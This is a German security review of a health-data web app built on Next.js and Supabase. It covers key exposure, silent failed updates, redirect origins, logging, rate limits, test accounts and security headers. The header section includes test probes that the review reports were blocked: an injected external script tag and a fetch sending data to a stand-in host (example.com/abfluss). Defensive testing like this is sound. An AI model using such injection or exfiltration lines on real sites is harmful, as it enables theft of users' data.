# Sicherheitsdurchsicht

| | |
|---|---|
| **Stand** | 25. August 2026 |
| **Anlass** | Das Produkt hält echte Gesundheitsdaten — besondere Kategorie nach Art. 9 DSGVO und nach revDSG. Der Zweig hat Datenbankzugriff, Anmeldung, Server-Aktionen und ein Framework-Upgrade in kurzer Folge bekommen; geprüft wurde bisher punktuell, nie im Zusammenhang. |
| **Bezug** | [TECHNIK.md](TECHNIK.md) · [KONZEPT.md](KONZEPT.md) · `supabase/migrations/0002_rls.sql` |

Jeder Punkt ist **behoben** oder als **bewusst getragenes Risiko** begründet. Wo etwas gemessen wurde, steht die Messung dabei; wo nur gelesen wurde, steht auch das.

Ein Grundsatz durchzieht die ganze Durchsicht: **Ein Befund ohne Gegenprobe ist kein Befund.** Eine Suche, die nichts findet, sagt nichts, solange nicht gezeigt ist, dass sie überhaupt etwas finden kann.

---

## Zusammenfassung

| # | Punkt | Ergebnis |
|---|---|---|
| 1 | Service-Role-Schlüssel | **behoben** — nirgends im Build, nirgends in der Historie; der ungenutzte Zugang im Code ist gelöscht |
| 2 | Server-Aktionen als öffentliche Endpunkte | **behoben** — ein verbotenes UPDATE meldete Erfolg |
| 3 | Aufzählen fremder Episoden | **geprüft, hält** — fremd und nicht vorhanden sind ununterscheidbar |
| 4 | Anmeldung verrät keine Konten | **geprüft, hält** in der Antwort; Zeitkanal ungemessen |
| 4b | Ziel des Anmeldelinks | **behoben** — kam aus einer Kopfzeile, die der Aufrufer setzt |
| 5 | Ratenbegrenzung | **getragenes Risiko** — hängt an Projekteinstellungen, gehört zu H3 |
| 6 | Protokolle | **geprüft, hält** — kein Morgenwert, keine Notiz, keine Adresse |
| 7 | Sicherheitskopfzeilen | **behoben** — keine war gesetzt, jetzt sechs plus Inhaltsrichtlinie |
| 8 | Testkonten | **behoben** — das Sondenskript braucht jetzt eine ausdrückliche Erlaubnis |

---

## 1 — Der Service-Role-Schlüssel

Er umgeht den zeilenbasierten Zugriffsschutz vollständig: die eine Zugangsberechtigung, die jedes Tagebuch jedes Nutzers lesen kann.

**Gemessen.** Der echte Wert aus `.env.local` wurde in allen **336 Dateien** des Builds gesucht — kein Treffer. Gegenprobe: der anon key, der dort hingehört, steht in **26 Dateien**. Die Suche funktioniert also.

Dasselbe für die Git-Historie über alle Zweige (`git log --all -S`): kein Commit. Gegenprobe mit einer Zeichenkette, die nachweislich in der Historie steht (`medication-in-window`): Treffer. `web/.env.local` war nie versioniert und ist über `.gitignore:12` ausgeschlossen.

**Ein Fund.** `SERVER_ENV` in `web/src/lib/env.ts` hielt einen Zugriff auf den Schlüssel — und **niemand hat ihn benutzt**. Die App nimmt durchgehend den anon key, damit jede Abfrage durch die Regeln geht; nur die beiden Entwicklerskripte brauchen den Schlüssel, und die lesen `.env.local` direkt.

Ein ungenutzter Export ist an sich die Familie aus Karte H15. Hier kam Einsatz dazu: Er lag in **derselben Datei**, aus der sich `lib/supabase/client.ts` — ein Client-Modul — `PUBLIC_ENV` holt.

**Wie schlimm es tatsächlich gewesen wäre, ehrlich:** Next ersetzt Umgebungsvariablen ohne `NEXT_PUBLIC_`-Präfix im Browserbündel durch `undefined`. Der Schlüssel wäre also **nicht** ausgeliefert worden; es hätte einen Laufzeitfehler gegeben. Das ist eine echte strukturelle Sicherung, und sie zu verschweigen wäre so falsch wie sich darauf zu verlassen.

**Behoben:** gelöscht. Wenn `flags` und `evaluations` in Woche 2 serverseitig geschrieben werden, entsteht der Zugang dort, wo er gebraucht wird — mit der Begründung von dann. Ein Vorrat für später ist eine offene Tür ohne Wächter.

---

## 2 — Server-Aktionen sind öffentliche Endpunkte

Eine Server-Aktion sieht aus wie ein Funktionsaufruf und ist ein HTTP-Endpunkt: Alles im Netz kann sie mit beliebigen Werten aufrufen. Die Autorisierung liegt allein beim zeilenbasierten Zugriffsschutz.

**Das ist vertretbar** — `supabaseServer()` nimmt bewusst den anon key, damit auch serverseitig jede Abfrage durch die Regeln geht. Serverseitig zu sein ist kein Grund, die Prüfung zu überspringen; ein Fehler in einer Abfrage läse sonst ein fremdes Tagebuch und sähe dabei aus, als funktioniere er.

**Der Fund.** Ein UPDATE, das die Regel verbietet, liefert **keinen Fehler**.

Gemessen an der echten Datenbank, Konto B gegen die Episode von Konto A:

```
UPDATE ohne .select():  error=null  status=204
UPDATE mit  .select():  error=null  Zeilen=0
ARCHIVIEREN:            error=null  status=204
Gegenprobe, A selbst:   error=null  Zeilen=1
Kennung ohne Episode:   error=null  Zeilen=0
```

Die Zeile bleibt unangetastet — der Zugriffsschutz filtert sie aus der Menge heraus, die das UPDATE überhaupt sieht. **Aber die App erfuhr davon nichts und meldete »Gespeichert.«**

Kein Datenverlust, kein fremder Zugriff. Trotzdem derselbe Fehler wie beim Tageseintrag in Karte H2: ein Schreibvorgang, der nicht stattgefunden hat, sieht aus wie einer, der stattgefunden hat. Wen es in der Praxis trifft, ist nicht der Angreifer, sondern die Person, deren Sitzung mitten in einer Korrektur abgelaufen ist.

**Behoben:** `updateEpisode` und `setArchived` hängen `.select("id")` an und werfen bei null Zeilen. Die Aktion meldet dann `failed`.

---

## 3 — Aufzählen fremder Episoden

`getEpisode` liest mit `.maybeSingle()`; der Zugriffsschutz macht aus »gehört jemand anderem« ein »keine Zeile«, und die Seite antwortet mit 404.

Die Messung aus Punkt 2 zeigt, dass das auch für den Schreibweg gilt: **fremde Episode und nicht vorhandene Kennung liefern beide null Zeilen.** Wer Kennungen durchprobiert, lernt daraus nichts — nicht einmal, ob es die Kennung gibt.

**Hält.** Die Ununterscheidbarkeit ist jetzt ausdrücklich im Code festgehalten, damit sie nicht bei der nächsten Fehlermeldung aus Versehen aufgehoben wird.

---

## 4 — Die Anmeldung verrät nicht, wer ein Konto hat

`requestSignInLink` gibt `{ ok: true }` zurück, wenn Supabase keinen Fehler meldet, und sonst genau ein `send-failed` — alle Fehlerursachen fallen in dieselbe Antwort. `signInWithOtp` legt bei unbekannter Adresse ein Konto an (passwortlos heisst: Anmelden und Registrieren sind dasselbe), also ist der Erfolgsfall für bekannt und unbekannt derselbe.

**Ungemessen: der Zeitkanal.** Ein Lauf, der ein Konto anlegt, macht einen Schreibvorgang mehr als einer, der keines anlegt. Ob der Unterschied über das Netz messbar ist, wurde **nicht** geprüft — eine belastbare Messung braucht viele Durchläufe und verschickt dabei echte E-Mails.

**Getragen**, mit Begründung: Der Kanal verrät bestenfalls, ob eine Adresse bereits ein Konto hat. Das ist bei einem Produkt, bei dem jede Adresse eines bekommen kann, sobald jemand sie eintippt, eine geringe Auskunft. Er steht hier, damit er nicht als geprüft gilt.

### 4b — Wohin der Anmeldelink zeigt

**Ein Fund, den die Karte nicht genannt hatte.** `requestSignInLink` baute das Rückkehrziel aus `headers().get("origin")` — einem Wert, den der Aufrufer der Server-Aktion setzt. Daraus entsteht die Adresse, an die ein **Anmeldelink** geht, und ein Anmeldelink trägt einen Token, der ein Konto öffnet.

**Ausnutzbar war es heute nicht:** Supabase prüft `emailRedirectTo` gegen die Liste erlaubter Rückkehradressen des Projekts und fällt sonst auf die Site-URL zurück. Die Sicherheit lag also an einer Einstellung im Verwaltungsbereich, nicht am Code.

Genau diese Liste wird beim Einrichten von eigenem SMTP angefasst — der Moment, in dem jemand versucht ist, ein Platzhalterzeichen hineinzuschreiben.

**Behoben:** `NEXT_PUBLIC_SITE_URL` hat Vorrang, die Kopfzeile bleibt nur als Rückfall für die Entwicklung. Optional gehalten, damit heute nichts bricht; **vor einer Auslieferung Pflicht**, steht so in `.env.example`.

---

## 5 — Ratenbegrenzung

Die App selbst begrenzt nichts. Supabase drosselt den Mailversand projektweit und pro Adresse; die geltenden Werte stehen im Verwaltungsbereich unter *Authentication → Rate Limits* und sind erst mit eigenem SMTP frei einstellbar.

**Was daran unangenehm ist**, ausgesprochen: Eine projektweite Obergrenze für Mails heisst, dass jemand, der wiederholt Anmeldelinks anfordert, das Kontingent für **alle** aufbrauchen kann. Das ist keine Datenpreisgabe, sondern eine Verfügbarkeitsfrage — aber es ist die, die eine Anmeldung lahmlegt.

**Getragen, mit Auftrag.** Eine Begrenzung pro Herkunftsadresse braucht Zustand am Rand des Netzes und damit Infrastruktur, die es noch nicht gibt. Die Werte dieses Projekts sind **ungeprüft**; sie zu prüfen und zu setzen ist Teil von Karte H3 und dort vermerkt.

---

## 6 — Was in Protokollen steht

Im gesamten App-Code gibt es genau zwei Protokollaufrufe, `global-error.tsx` und `ErrorScreen.tsx`, beide in Client-Bauteilen und damit in der Browserkonsole. Beide schreiben `error.digest ?? error.message` — bevorzugt also die Kennnummer, die den Fehler in den Serverprotokollen findet und für sich nichts aussagt.

**Kein Morgenwert, keine Notiz, keine Adresse.** Der Grund steht seit H2 im Code: `error.message` kann von Supabase kommen und Tabellen- und Spaltennamen enthalten; auf einen Bildschirm im Wartezimmer gehört das nicht.

Was serverseitig anfällt, sind Anfragepfade — und ein Pfad enthält eine Episodenkennung. Das ist ein pseudonymer Bezeichner, kein Messwert. **Hält.**

---

## 7 — Sicherheitskopfzeilen

**Gemessen, vorher:** keine einzige. Dafür ein `X-Powered-By: Next.js`, das einem Scanner kostenlos verrät, welche Angriffe sich lohnen.

**Behoben.** `Referrer-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Permissions-Policy` in `next.config.ts` (auch für `/_next/*`, das der Proxy auslässt), `poweredByHeader: false`, und eine Inhaltsrichtlinie mit einem Nonce je Anfrage im Proxy.

**Die wichtigste Zeile ist `connect-src`** — nicht, weil eine Skriptlücke wahrscheinlich wäre, sondern weil sie bestimmt, *wohin* Daten überhaupt gehen können. Sie hat genau zwei Einträge: die eigene Herkunft und das Supabase-Projekt.

**Nachgewiesen, dass beides gilt** — die Seite läuft und die Richtlinie sperrt:

| Probe | Ergebnis |
|---|---|
| »Einheit hinzufügen« angeklickt | ein Auswahlfeld mehr → React ist hydriert, das Bündel lief unter dem Nonce |
| `<script src="https://example.com/…">` eingesetzt | blockiert |
| `fetch("https://example.com/abfluss", …)` | *»Refused to connect because it violates the document's Content Security Policy«* |

**Bewusst offen: `style-src 'unsafe-inline'`.** Diese App setzt ihre Stile als `style={{…}}`-Attribut, und ein Attribut kann keinen Nonce tragen. Ein Stilattribut führt keinen Code aus; der Schaden, den es anrichten kann, ist optisch. `'unsafe-eval'` steht **nur** in der Entwicklung, wo der Neuladen-Mechanismus es braucht.

---

## 8 — Die Testkonten

`dev-test@loadwise.test`, `rls-probe-a@loadwise.test`, `rls-probe-b@loadwise.test`.

`npm run check:rls` legt die beiden Sondenkonten an, meldet sich als beide an und schreibt Prüfzeilen in zehn Tabellen. In einer Entwicklungsdatenbank ist das genau richtig. In einer Produktionsdatenbank wären es zwei Konten mit Zugang, die niemand angelegt hat und die in keiner Liste stehen.

**Vorher entschied darüber allein, worauf `.env.local` gerade zeigte.** Ein kopierter Schlüssel, ein umgestelltes Projekt, ein Lauf aus Gewohnheit.

**Behoben:** Das Skript verlangt `LOADWISE_ALLOW_PROBE_ACCOUNTS=ja` in `.env.local` und bricht sonst ab. Belegt, dass der Riegel greift: ohne die Zeile Abbruch mit Erklärung, mit der Zeile *»Alle 40 Prüfungen halten«*. Die Zeile steht in `.env.example` mit dem Vermerk, dass sie in einer Produktionsumgebung wegbleibt.

**Offen bleibt** das Aufräumen vor einer Veröffentlichung: Die drei Konten und die Sondenzeilen müssen aus der Datenbank, aus der ausgeliefert wird. Solange Entwicklung und Produktion dasselbe Projekt sind, ist das nicht abschliessbar — es gehört zum Trennen der beiden und steht auf dem Brett.

---

## Was diese Durchsicht nicht geleistet hat

- **Die Abhängigkeiten sind geprüft, aber nicht bewacht.** `npm audit --audit-level=low` meldet heute **0 Schwachstellen**. Es läuft jetzt in CI — vorher lief es gar nicht, und das war der eigentliche Mangel: Dieses Projekt hatte schon einmal zwei kritische Verwundbarkeiten in einer festgenagelten Testbibliothek, gefunden nur, weil jemand hinsah.
- **Kein Penetrationstest.** Was hier steht, ist gelesener Code plus gezielte Messungen — nicht der Versuch, das Produkt zu brechen.
- **Keine Aussage über Supabase selbst.** Der Zugriffsschutz ist geprüft (40 Prüfungen, `npm run check:rls`); die Plattform darunter ist geglaubt.
- **Der Zeitkanal bei der Anmeldung** ist ungemessen, siehe Punkt 4.
